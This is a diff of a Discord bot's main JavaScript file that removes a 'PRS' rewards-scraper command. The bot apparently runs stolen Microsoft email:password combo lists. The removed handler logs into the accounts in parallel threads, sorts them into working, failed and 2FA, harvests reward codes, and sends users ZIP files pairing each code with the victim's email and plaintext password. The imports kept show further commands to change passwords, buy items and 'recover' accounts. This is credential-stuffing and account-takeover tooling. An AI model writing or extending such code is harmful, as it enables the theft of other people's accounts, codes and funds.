@@ -13,7 +13,7 @@ const { sendToWebhook } = require("./utils/webhook");
 const { checkCodes } = require("./utils/microsoft-checker");
 const { claimWlids } = require("./utils/microsoft-claimer");
 const { pullCodes, pullLinks } = require("./utils/microsoft-puller");
-const { scrapeRewards, getCategoryList, getCategoryFileName } = require("./utils/microsoft-rewards-scraper");
+
 const { checkInboxAccounts, getServiceCount } = require("./utils/microsoft-inbox");
 const { searchProducts, getProductDetails, purchaseItems } = require("./utils/microsoft-purchaser");
 const { changePasswords, checkAccounts } = require("./utils/microsoft-changer");
@@ -32,8 +32,6 @@ const {
   promoPullerResultsEmbed,
   inboxAioProgressEmbed,
   inboxAioResultsEmbed,
-  prsProgressEmbed,
-  prsResultsEmbed,
   purchaseResultsEmbed,
   purchaseProgressEmbed,
   productSearchEmbed,
@@ -1436,191 +1434,6 @@ async function handleInboxAio(respond, userId, accountsRaw, accountsFile, thread
   }
 }
 
-// ── PRS (Rewards Scraper) handler ────────────────────────────
-
-async function handlePrs(respond, userId, accountsRaw, accountsFile, category = "All", threads = 10, dmUser = null) {
-  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
-
-  const acquire = limiter.acquire(userId, "prs");
-  if (!acquire.ok) {
-    const reason = acquire.reason === "busy"
-      ? "You already have a command running. Wait for it to finish."
-      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
-    return respond({ embeds: [errorEmbed(reason)] });
-  }
-
-  const ac = new AbortController();
-  activeAborts.set(userId, ac);
-  const startTime = Date.now();
-
-  try {
-    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
-    if (accountsFile) {
-      const lines = await fetchAttachmentLines(accountsFile);
-      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
-    }
-
-    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
-    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
-
-    const msg = await respond({
-      embeds: [prsProgressEmbed({ done: 0, total: accounts.length, codesFound: 0, category, working: 0, failed: 0, elapsed: 0, username: dmUser?.username })],
-      components: [stopButton(userId)],
-      fetchReply: true,
-    });
-
-    let lastUpdate = Date.now();
-    let totalCodes = 0;
-    let working = 0;
-    let failed = 0;
-
-    const { results, allCodes } = await scrapeRewards(accounts, category, threads, (done, total, lastResult) => {
-      if (lastResult) {
-        if (lastResult.status === "hit" || lastResult.status === "valid") working++;
-        else failed++;
-        totalCodes += (lastResult.codes?.length || 0);
-      }
-
-      const now = Date.now();
-      if (now - lastUpdate > 2500) {
-        lastUpdate = now;
-        updateProgress(msg, prsProgressEmbed({
-          done,
-          total,
-          codesFound: totalCodes,
-          category,
-          working,
-          failed,
-          elapsed: Date.now() - startTime,
-          latestAccount: lastResult?.email || "",
-          username: dmUser?.username,
-        }), userId);
-      }
-    }, ac.signal);
-
-    const stopped = ac.signal.aborted;
-    const elapsed = Date.now() - startTime;
-
-    // Categorize results
-    const hitResults = results.filter(r => r.status === "hit");
-    const validResults = results.filter(r => r.status === "valid");
-    const failedResults = results.filter(r => r.status === "invalid" || r.status === "error");
-    const twoFAResults = results.filter(r => r.status === "2fa");
-
-    // Build category breakdown
-    const categoryBreakdown = {};
-    for (const code of allCodes) {
-      const cat = code.category || "Unknown";
-      categoryBreakdown[cat] = (categoryBreakdown[cat] || 0) + 1;
-    }
-
-    // Build ZIP entries
-    const zipEntries = [];
-    const codesByCategory = {};
-    for (const code of allCodes) {
-      const fileName = getCategoryFileName(code.category || "Unknown");
-      if (!codesByCategory[fileName]) codesByCategory[fileName] = [];
-      codesByCategory[fileName].push(code);
-    }
-
-    // Per-category files
-    for (const [catName, codes] of Object.entries(codesByCategory)) {
-      const lines = codes.map(c => {
-        let line = `${c.code}`;
-        line += `\nAccount: ${c.email}`;
-        line += `\nPassword: ${c.password}`;
-        line += `\nInfo: ${c.info}`;
-        if (c.redemptionUrl) line += `\nURL: ${c.redemptionUrl}`;
-        line += `\nDate: ${c.date}`;
-        line += `\n${"-".repeat(30)}`;
-        return line;
-      });
-      zipEntries.push({ name: `${catName}.txt`, content: `${catName.toUpperCase()} CODES\n${"=".repeat(50)}\n\n${lines.join("\n\n")}` });
-    }
-
-    // All codes combined
-    if (allCodes.length > 0) {
-      const allLines = allCodes.map(c => {
-        let line = `${c.code} | ${c.info}`;
-        if (c.redemptionUrl) line += ` | ${c.redemptionUrl}`;
-        line += ` | ${c.email}`;
-        return line;
-      });
-      zipEntries.push({ name: "all_codes.txt", content: allLines.join("\n") });
-    }
-
-    // Valid accounts (those that logged in successfully)
-    const validAccounts = results.filter(r => r.status === "hit" || r.status === "valid");
-    if (validAccounts.length > 0) {
-      zipEntries.push({ name: "valid_accounts.txt", content: validAccounts.map(r => {
-        const acc = accounts.find(a => a.startsWith(r.email + ":"));
-        return acc || r.email;
-      }).join("\n") });
-    }
-
-    // Failed accounts
-    if (failedResults.length > 0) {
-      zipEntries.push({ name: "failed.txt", content: failedResults.map(r => `${r.email} | ${r.status}`).join("\n") });
-    }
-
-    // Summary
-    zipEntries.push({ name: "summary.txt", content: [
-      "=".repeat(70),
-      `${category.toUpperCase()} Results Summary - ${new Date().toISOString()}`,
-      "=".repeat(70),
-      `Valid Accounts: ${validAccounts.length}`,
-      `Failed Accounts: ${failedResults.length}`,
-      `2FA Accounts: ${twoFAResults.length}`,
-      `Total Codes: ${allCodes.length}`,
-      "=".repeat(70),
-      "",
-      ...Object.entries(categoryBreakdown).map(([cat, count]) => `${cat.toUpperCase()} (${count} codes)`),
-      "",
-      "=".repeat(70),
-      "PRS - Rewards Scraper",
-      "=".repeat(70),
-    ].join("\n") });
-
-    const embed = prsResultsEmbed({
-      total: results.length,
-      hits: hitResults.length,
-      valid: validResults.length,
-      failed: failedResults.length,
-      twoFA: twoFAResults.length,
-      codesFound: allCodes.length,
-      category,
-      elapsed,
-      categoryBreakdown,
-      username: dmUser?.username,
-    });
-    if (stopped) embed.setDescription(embed.data.description + "\n\n*Stopped -- partial results*");
-
-    // Bundle into ZIP
-    const { AttachmentBuilder } = require("discord.js");
-    const { buildZipBuffer } = require("./utils/zip-builder");
-    const zipBuffer = buildZipBuffer(zipEntries);
-    const zipFile = new AttachmentBuilder(zipBuffer, { name: `prs_${category.toLowerCase().replace(/ /g, "_")}_results.zip` });
-
-    if (dmUser) {
-      try {
-        await dmUser.send({ embeds: [embed], files: [zipFile] });
-        await msg.edit({ embeds: [infoEmbed("PRS Complete", `Scraped ${results.length} accounts for ${category}. ${allCodes.length} codes found. Results sent to your DMs.`)], components: [] });
-      } catch {
-        await msg.edit({ embeds: [embed], files: [zipFile], components: [] });
-      }
-    } else {
-      await msg.edit({ embeds: [embed], files: [zipFile], components: [] });
-    }
-
-    statsManager.record(userId, "prs", allCodes.length);
-
-  } catch (err) {
-    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
-  } finally {
-    activeAborts.delete(userId);
-    limiter.release(userId);
-  }
-}
 
 // ── Slash Commands ───────────────────────────────────────────
 
@@ -1790,14 +1603,6 @@ client.on("interactionCreate", async (interaction) => {
       await handleRewards(respond, user.id, accounts, accountsFile, threads, user);
     }
 
-    else if (commandName === "prs") {
-      await interaction.deferReply();
-      const accounts = interaction.options.getString("accounts");
-      const accountsFile = interaction.options.getAttachment("accounts_file");
-      const category = interaction.options.getString("category") || "All";
-      const threads = interaction.options.getInteger("threads") || 10;
-      await handlePrs(respond, user.id, accounts, accountsFile, category, threads, user);
-    }
 
     else if (commandName === "recover") {
       await interaction.deferReply();
@@ -2003,30 +1808,6 @@ client.on("messageCreate", async (message) => {
       await handleRewards(respond, message.author.id, accountsRaw, attachment, 3, message.author);
     }
 
-    else if (cmd === "prs") {
-      // Parse category from first arg if it matches a known category
-      const categories = getCategoryList().map(c => c.toLowerCase());
-      let category = "All";
-      let accountsStartIdx = 0;
-
-      // Check if first arg is a category name (could be multi-word like "sea of thieves")
-      for (let wordCount = 3; wordCount >= 1; wordCount--) {
-        const testCat = args.slice(0, wordCount).join(" ").toLowerCase();
-        if (categories.includes(testCat)) {
-          category = getCategoryList().find(c => c.toLowerCase() === testCat) || "All";
-          accountsStartIdx = wordCount;
-          break;
-        }
-      }
-
-      const accountsRaw = args.slice(accountsStartIdx).join(" ");
-      const attachment = message.attachments.first();
-      if (!accountsRaw && !attachment) {
-        const catList = getCategoryList().map(c => `  - ${c}`).join("\n");
-        return respond({ embeds: [infoEmbed("Usage", `\`.prs [category] <accounts>\` or attach a .txt file\n\nCategories:\n${catList}\n\nDefault: All\nResults sent to your DMs as a ZIP file.`)] });
-      }
-      await handlePrs(respond, message.author.id, accountsRaw, attachment, category, 10, message.author);
-    }
 
     else if (cmd === "recover") {
       const newPassword = args.pop();
